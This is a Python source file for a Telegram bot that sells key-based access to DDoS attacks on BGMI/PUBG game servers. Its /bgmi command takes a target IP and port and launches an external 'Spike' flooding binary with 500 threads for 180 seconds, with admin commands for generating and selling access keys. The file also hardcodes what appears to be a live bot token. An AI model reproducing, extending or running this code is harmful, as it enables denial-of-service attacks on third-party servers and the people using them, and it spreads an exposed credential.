from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import threading
import random
import string
import time
import asyncio

# Global variables
attack_running = False
authorized_users = {}  # {user_id: expiry_time}
keys = {}  # {key: expiry_time}

# Define admin ID
ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID

# Define default values
DEFAULT_PACKET_SIZE = 12
DEFAULT_THREADS = 500
MAX_ATTACK_TIME = 180  # in seconds

# Function to generate random keys
def generate_key(duration):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    keys[key] = time.time() + duration
    return key

# Parse duration strings (e.g., "1hour", "2days")
def parse_duration(duration_str):
    if 'hour' in duration_str:
        return int(duration_str.replace('hour', '')) * 3600
    elif 'day' in duration_str:
        return int(duration_str.replace('day', '')) * 86400
    return None

# Function to run the attack
import asyncio

def attack(ip, port, context, chat_id, attacker_id):
    global attack_running

    # Start the attack
    process = subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
    
    # Wait for the attack duration
    time.sleep(MAX_ATTACK_TIME)  # Ensures the attack runs for the given time

    # Mark attack as finished BEFORE sending notifications
    attack_running = False

    # Notify the attacker that the attack is finished
    attack_finished_message = (
        f"✅ **Attack Finished!**\n\n"
        f"🎯 **Target IP:** `{ip}`\n"
        f"📌 **Port:** `{port}`\n"
        f"⏳ **Duration:** `{MAX_ATTACK_TIME} seconds`"
    )
    asyncio.run(context.bot.send_message(chat_id=chat_id, text=attack_finished_message, parse_mode="Markdown"))

    # Notify users who tried to start an attack while one was running
    for pending_user in pending_users:
        asyncio.run(context.bot.send_message(
            chat_id=pending_user, 
            text="✅ **Another user's attack has finished. You can now start your attack!**"
        ))

    # Clear the pending users list
    pending_users.clear()




# Command: Start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_message = (
        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
        "⚡️ _A powerfull tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
        "✨ **Key Features:**\n"
        "   • Start attacks with `/bgmi` command\n"
        "   • Key-based authorization system\n"
        "   • Admin controls for key generation\n"
        "   • Real-time attack monitoring\n\n"
        "🔧 **Commands:**\n"
        "   /help - Show all commands\n"
        "   /bgmi - Start attack\n"
        "   /redeem - Activate your key\n\n"
        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
        "⚙️ _Use this bot responsibly!_"
    )
    await update.message.reply_text(start_message, parse_mode="Markdown")

# Command: Show help
async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "🛠️ *Available Commands* 🛠️\n\n"
        "🎮 *Attack Commands:*\n"
        "`/bgmi <ip> <port>` - Start a new attack\n"
        "`/redeem <key>` - Redeem your access key\n\n"
        "🔑 *Admin Commands:*\n"
        "`/genkey <duration>` - Generate single key\n"
        "`/mgenkey <duration> <amount>` - Bulk generate keys\n"
        "`/users` - List authorized users\n\n"
        "ℹ️ *Info Commands:*\n"
        "`/start` - Show bot introduction\n"
        "`/help` - Display this message\n\n"
        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
        "🔒 _All attacks are logged and monitored_"
    )
    await update.message.reply_text(help_message, parse_mode="Markdown")

# Command: Start an attack
# Track pending users waiting to attack
pending_users = set()

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_running
    user_id = update.message.from_user.id

    # Check if user is authorized
    if user_id not in authorized_users or time.time() > authorized_users[user_id]:
        await update.message.reply_text('❌ You are not authorized. Redeem a key first.')
        return

    # Check if an attack is already running
    if attack_running:
        await update.message.reply_text('⏳ Another attack is running. Please wait...')
        
        # Add user to pending users set if not already in it
        pending_users.add(user_id)
        return

    # Validate command arguments
    if len(context.args) < 2:
        await update.message.reply_text('Usage: /bgmi <ip> <port>')
        return

    ip, port = context.args[0], context.args[1]
    attack_running = True

    # Send attack details
    attack_details = (
        f"🚀 **Attack Started!**\n\n"
        f"🎯 **Target IP:** `{ip}`\n"
        f"📌 **Port:** `{port}`\n"
        f"⏳ **Duration:** `{MAX_ATTACK_TIME} seconds`"
    )
    await update.message.reply_text(attack_details, parse_mode="Markdown")

    # Run the attack in a separate thread
    threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id, user_id)).start()


# Command: Generate a key (Admin only)
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /genkey <duration>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    key = generate_key(duration)
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺:\n\n`{key}`', parse_mode="Markdown")

# Command: Generate multiple keys (Admin only)
async def mgenkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 2:
        await update.message.reply_text('Usage: /mgenkey <duration> <number>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    number = int(context.args[1])
    keys_list = [generate_key(duration) for _ in range(number)]
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺𝘴:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]), parse_mode="Markdown")

# Command: List authorized users (Admin only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    users_list = '\n'.join([f'{user_id}: {time.ctime(expiry)}' for user_id, expiry in authorized_users.items()])
    await update.message.reply_text(f'📜 𝘈𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘶𝘴𝘦𝘳𝘴:\n\n{users_list}')

# Command: Redeem a key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /redeem <key>')
        return

    key = context.args[0]

    # Check if the key is valid
    if key not in keys or time.time() > keys[key]:
        await update.message.reply_text('❌ Invalid or expired key.')
        return

    # Ensure the user doesn't already have an active key
    if user_id in authorized_users and time.time() < authorized_users[user_id]:
        await update.message.reply_text('❌ You already have an active key. Wait for it to expire before redeeming a new one.')
        return

    # Assign key and remove from the list
    authorized_users[user_id] = keys[key]
    del keys[key]
    
    await update.message.reply_text('✅ Key redeemed successfully! You are now authorized to use /bgmi.')

# Main function to start the bot
def main():
    # Create the Application
    application = Application.builder().token("8022705558:AAFAJD_--b6f96kuatpQOqPMefnec7hIQPY").build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("mgenkey", mgenkey))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("redeem", redeem))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
